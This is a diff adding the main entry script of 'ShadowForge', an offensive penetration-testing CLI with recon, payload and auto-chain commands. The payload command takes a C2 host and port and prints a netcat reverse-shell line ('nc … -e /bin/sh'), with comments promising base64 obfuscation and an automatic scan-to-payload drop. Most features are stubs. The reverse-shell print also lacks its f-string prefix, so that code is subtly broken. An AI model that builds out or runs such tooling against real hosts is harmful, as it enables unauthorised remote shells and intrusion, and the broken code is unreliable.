@@ -1,0 +1,70 @@
+#!/usr/bin/env python3
+# main.py – ShadowForge CLI Beast
+import argparse
+import sys
+import os
+from recon import run_recon  # Hook your recon module (create next)
+
+# ANSI colors – raw grit, no pip
+class Colors:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    END = '\033[0m'
+
+def banner():
+    print(f"{Colors.GREEN}🛡️ ShadowForge: From Ranch Grit to Root Access 🛡️{Colors.END}")
+    print(f"{Colors.YELLOW}Ethical Pentest Beast – Scan, Exploit, Dominate{Colors.END}\n")
+
+def main():
+    parser = argparse.ArgumentParser(description='ShadowForge Toolkit – Viking Code Raids')
+    parser.add_argument('--version', action='version', version='0.1.0 – Forge Ignited')
+    
+    subparsers = parser.add_subparsers(dest='command', help='Commands: recon | payload | auto')
+    
+    # Recon subparser
+    recon_parser = subparsers.add_parser('recon', help='Network Recon Raid')
+    recon_parser.add_argument('--target', required=True, help='Target IP/Host (e.g., 192.168.1.1)')
+    recon_parser.add_argument('--json', action='store_true', help='Dump JSON output')
+    
+    # Payload stub (tease for tomorrow)
+    payload_parser = subparsers.add_parser('payload', help='Generate Payloads')
+    payload_parser.add_argument('--type', default='shell', help='Payload type (shell)')
+    payload_parser.add_argument('--host', help='C2 Host')
+    payload_parser.add_argument('--port', type=int, default=4444, help='C2 Port')
+    
+    # Auto stub
+    auto_parser = subparsers.add_parser('auto', help='Chain Scan → Payload Drop')
+    auto_parser.add_argument('--target', required=True, help='Target for auto-chain')
+    
+    args = parser.parse_args()
+    
+    if not args.command:
+        parser.print_help()
+        sys.exit(1)
+    
+    banner()
+    
+    if args.command == 'recon':
+        print(f"{Colors.BLUE}🔍 Recon Raid on {args.target}...{Colors.END}")
+        results = run_recon(args.target)
+        if args.json:
+            import json
+            print(json.dumps(results, indent=2))
+        else:
+            print(f"{Colors.GREEN}Ports Open: {len(results.get('ports', []))}{Colors.END}")
+            # Echo sample: for port in results['ports']: print(f"Port {port['port']}: {port['service']}")
+    
+    elif args.command == 'payload':
+        print(f"{Colors.RED}💣 Payload Forge: {args.type} to {args.host}:{args.port}{Colors.END}")
+        # Stub: from payloads import gen_shell; print(gen_shell(args.host, args.port))
+        print("Shell primed: nc {args.host} {args.port} -e /bin/sh (base64 cloak next)")
+    
+    elif args.command == 'auto':
+        print(f"{Colors.YELLOW}⚡ Auto Chain: Targeting {args.target}{Colors.END}")
+        # Stub: recon → if vuln: payload drop
+        print("Scan clean → Payload ready. Full chain EOD.")
+
+if __name__ == '__main__':
+    main()
